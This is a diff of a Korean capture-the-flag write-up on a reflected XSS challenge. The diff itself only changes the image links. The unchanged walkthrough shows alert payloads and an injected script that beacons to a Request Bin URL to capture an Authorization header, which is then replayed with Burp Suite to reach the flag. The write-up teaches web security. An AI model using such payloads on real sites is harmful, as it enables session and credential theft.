@@ -200,35 +200,35 @@ Reflected XSS
 ## 4. Payload
 
 1. `/intro` 페이지에 접속한다.
-	![Captured Page](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@main/_image/2026-09-14-11-30-04.png)
+	![Captured Page](https://cdn.jsdelivr.net/gh/s3mper/s3mper.github.io@main/_image/2026-09-14-11-30-04.png)
 2. `/intro` 기능의 기능을 확인한다.
 	- `/intro?name=1&detail=2`
-	![Captured Page](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@main/_image/2026-09-14-11-30-50.png)
+	![Captured Page](https://cdn.jsdelivr.net/gh/s3mper/s3mper.github.io@main/_image/2026-09-14-11-30-50.png)
 	- 화면에 입력값이 바로 출력되는 것이 보인다.
 3. Reflected XSS가 되는 지 확인한다.
 	- `/intro?name=<script>alert(1)</script>&detail=<script>alert(2)</script>`
-	![Captured Page](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@main/_image/2026-09-14-11-32-01.png)
-	![Captured Page](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@main/_image/2026-09-14-11-32-27.png)
+	![Captured Page](https://cdn.jsdelivr.net/gh/s3mper/s3mper.github.io@main/_image/2026-09-14-11-32-01.png)
+	![Captured Page](https://cdn.jsdelivr.net/gh/s3mper/s3mper.github.io@main/_image/2026-09-14-11-32-27.png)
 	→ Reflected XSS가 되는 것을 확인했다.
 4. `/report`의 기능을 확인한다.
 	- `/intro?name=1&detail=2`
-	![Captured Page](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@main/_image/2026-09-14-11-33-13.png)
-	![Captured Page](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@main/_image/2026-09-14-11-33-50.png)
+	![Captured Page](https://cdn.jsdelivr.net/gh/s3mper/s3mper.github.io@main/_image/2026-09-14-11-33-13.png)
+	![Captured Page](https://cdn.jsdelivr.net/gh/s3mper/s3mper.github.io@main/_image/2026-09-14-11-33-50.png)
 	- 정상적으로 성공하면 `Success` 문구가 출력되는 것을 확인했다.
 5. XSS 스크립트를 삽입한다.
 	- `/intro?name=<script>let img=new Image();img.src="<드림핵 Request Bin URL>";document.body.appendChild(img);</script>&detail=1`
-	![Captured Page](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@main/_image/2026-09-14-11-34-29.png)
-	![Captured Page](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@main/_image/2026-09-14-11-34-53.png)
+	![Captured Page](https://cdn.jsdelivr.net/gh/s3mper/s3mper.github.io@main/_image/2026-09-14-11-34-29.png)
+	![Captured Page](https://cdn.jsdelivr.net/gh/s3mper/s3mper.github.io@main/_image/2026-09-14-11-34-53.png)
 	- 실행에 성공한 것을 확인했다.
 6. Request Bin을 확인한다.
-	![Captured Page](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@main/_image/2026-09-14-11-36-26.png)
+	![Captured Page](https://cdn.jsdelivr.net/gh/s3mper/s3mper.github.io@main/_image/2026-09-14-11-36-26.png)
 	- `/whoami` 페이지 인증에 필요한 `Authorization` 헤더값 확인
 7. `/whoami`에 접속
-	![Captured Page](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@main/_image/2026-09-14-11-36-58.png)
+	![Captured Page](https://cdn.jsdelivr.net/gh/s3mper/s3mper.github.io@main/_image/2026-09-14-11-36-58.png)
 	- 기본적으로 접속하면 `guest`임을 확인
 8. `/whoami` 접속할 때 `Authorization` 헤더 삽입한다.
-	![Captured Page](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@main/_image/2026-09-14-11-37-58.png)
+	![Captured Page](https://cdn.jsdelivr.net/gh/s3mper/s3mper.github.io@main/_image/2026-09-14-11-37-58.png)
 	- Burp Suite를 이용해 Request 요청에 Authorization을 삽입했다.
 9. flag 확인
-	![Captured Page](https://cdn.jsdelivr.net/gh/aliquis-facio/aliquis-facio.github.io@main/_image/2026-09-14-11-39-10.png)
+	![Captured Page](https://cdn.jsdelivr.net/gh/s3mper/s3mper.github.io@main/_image/2026-09-14-11-39-10.png)
 	- flag 값을 확인할 수 있다.
